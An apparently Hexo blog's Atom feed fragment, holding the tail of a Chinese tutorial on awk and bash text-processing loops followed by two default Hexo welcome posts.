class="line"></span><br><span class="line">awk <span class="string">'!/linux/'</span></span><br><span class="line"><span class="comment">#不包含linux文本的行</span></span><br><span class="line"></span><br><span class="line">设置定界符</span><br><span class="line"></span><br><span class="line">使用-F来设置定界符（默认为空格）</span><br><span class="line"></span><br><span class="line">awk -F: <span class="string">'&#123;print $NF&#125;'</span>/etc/passwd</span><br><span class="line"></span><br><span class="line">读取命令输出</span><br><span class="line"></span><br><span class="line">使用getline，将外部shell命令的输出读入到变量cmdout中；</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> | awk <span class="string">'&#123;"grep root /etc/passwd" | getline cmdout; print cmdout &#125;'</span></span><br><span class="line"></span><br><span class="line">在awk中使用循环</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=0;i&lt;10;i++)&#123;<span class="built_in">print</span> <span class="variable">$i</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i <span class="keyword">in</span> array)&#123;<span class="built_in">print</span> array[i];&#125;</span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line"></span><br><span class="line">以逆序的形式打印行：(tac命令的实现）</span><br><span class="line"></span><br><span class="line">seq 9|awk <span class="string">'&#123;lifo[NR] = $0; lno=NR&#125;</span></span><br><span class="line"><span class="string">END&#123; for(;lno&gt;-1;lno--)&#123;print lifo[lno];&#125;</span></span><br><span class="line"><span class="string">&#125; '</span></span><br><span class="line"></span><br><span class="line">awk实现head、tail命令</span><br><span class="line"></span><br><span class="line">head:  awk <span class="string">'NR&lt;=10&#123;print&#125;'</span> filename</span><br><span class="line">tail:  awk <span class="string">'&#123;buffer[NR%10] = $0;&#125; END&#123;for(i=0;i&lt;11;i++)&#123;  print buffer[i %10]&#125; &#125; '</span> filename</span><br><span class="line"></span><br><span class="line">打印指定列</span><br><span class="line"></span><br><span class="line">awk方式实现：</span><br><span class="line"></span><br><span class="line">ls -lrt | awk <span class="string">'&#123;print $6&#125;'</span></span><br><span class="line"></span><br><span class="line">cut方式实现</span><br><span class="line"></span><br><span class="line">ls -lrt | cut -f6</span><br><span class="line"></span><br><span class="line">打印指定文本区域</span><br><span class="line"></span><br><span class="line">确定行号</span><br><span class="line"></span><br><span class="line">seq 100| awk <span class="string">'NR==4,NR==6&#123;print&#125;'</span></span><br><span class="line"></span><br><span class="line">确定文本</span><br><span class="line"></span><br><span class="line">打印处于startpattern 和endpattern之间的文本；</span><br><span class="line"></span><br><span class="line">awk <span class="string">'/start_pattern/, /end_pattern/'</span> filename</span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line">seq 100| awk <span class="string">'/13/,/15/'</span></span><br><span class="line"></span><br><span class="line">cat /etc/passwd| awk <span class="string">'/mai.*mail/,/news.*news/'</span></span><br><span class="line"></span><br><span class="line">awk常用内建函数</span><br><span class="line"></span><br><span class="line">index(string,search_string):返回search_string在string中出现的位置</span><br><span class="line"></span><br><span class="line">sub(regex,replacement_str,string):将正则匹配到的第一处内容替换为replacement_str;</span><br><span class="line"></span><br><span class="line">match(regex,string):检查正则表达式是否能够匹配字符串；</span><br><span class="line"></span><br><span class="line">length(string)：返回字符串长度</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> | awk <span class="string">'&#123;"grep root /etc/passwd" | getline cmdout; print length(cmdout) &#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> 类似c语言中的<span class="built_in">printf</span>，对输出进行格式化</span><br><span class="line"></span><br><span class="line">eg：</span><br><span class="line"></span><br><span class="line">seq 10| awk <span class="string">'&#123;printf "-&gt;%4s ", $1&#125;'</span></span><br><span class="line"></span><br><span class="line">迭代文件中的行、单词和字符</span><br><span class="line"></span><br><span class="line">1. 迭代文件中的每一行</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> 循环法</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span></span><br><span class="line"> <span class="built_in">read</span> line;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$line</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">&lt; file.txt</span><br><span class="line"></span><br><span class="line">改成子shell:</span><br><span class="line"></span><br><span class="line">cat file.txt | (</span><br><span class="line"><span class="keyword">while</span></span><br><span class="line"> <span class="built_in">read</span> line;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="variable">$line</span>;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">awk法：</span><br><span class="line"></span><br><span class="line">cat file.txt| awk <span class="string">'&#123;print&#125;'</span></span><br><span class="line"></span><br><span class="line">2.迭代一行中的每一个单词</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span></span><br><span class="line"> word </span><br><span class="line"><span class="keyword">in</span></span><br><span class="line"> <span class="variable">$line</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$word</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><ol start="3"><li>迭代每一个字符<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;string:startpos:numof_chars&#125;</span>：从字符串中提取一个字符；(bash文本切片）</span><br><span class="line"><span class="variable">$&#123;#word&#125;</span>:返回变量word的长度</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span></span><br><span class="line">((i=</span><br><span class="line">0</span><br><span class="line">;i&lt;<span class="variable">$&#123;#word&#125;</span>;i++))</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> $&#123;word:i:</span><br><span class="line">1</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文将介绍Linux下使用Shell处理文本时最常用的工具：&lt;/p&gt;
&lt;p&gt;find、grep、xargs、sort、uniq、tr、cut、paste、wc、sed、awk；&lt;/p&gt;
&lt;p&gt;提供的例子和参数都是最常用和最为实用的；&lt;/p&gt;
&lt;p&gt;对shell脚本使用的原则
      
    
    </summary>
    
    
      <category term="linux资料" scheme="http://yoursite.com/categories/linux%E8%B5%84%E6%96%99/"/>
    
    
      <category term="linux文本处理" scheme="http://yoursite.com/tags/linux%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>是风来</title>
    <link href="http://yoursite.com/2019/10/27/New-Post-Test/"/>
    <id>http://yoursite.com/2019/10/27/New-Post-Test/</id>
    <published>2019-10-26T16:14:42.000Z</published>
    <updated>2019-10-27T03:08:31.424Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
      <category term="-分类处理" scheme="http://yoursite.com/categories/%E5%88%86%E7%B1%BB%E5%A4%84%E7%90%86/"/>
    
    
      <category term="-标签处理" scheme="http://yoursite.com/tags/%E6%A0%87%E7%AD%BE%E5%A4%84%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2019/10/26/hello-world/"/>
    <id>http://yoursite.com/2019/10/26/hello-world/</id>
    <published>2019-10-26T04:25:29.057Z</published>
    <updated>2019-10-26T04:25:29.057Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
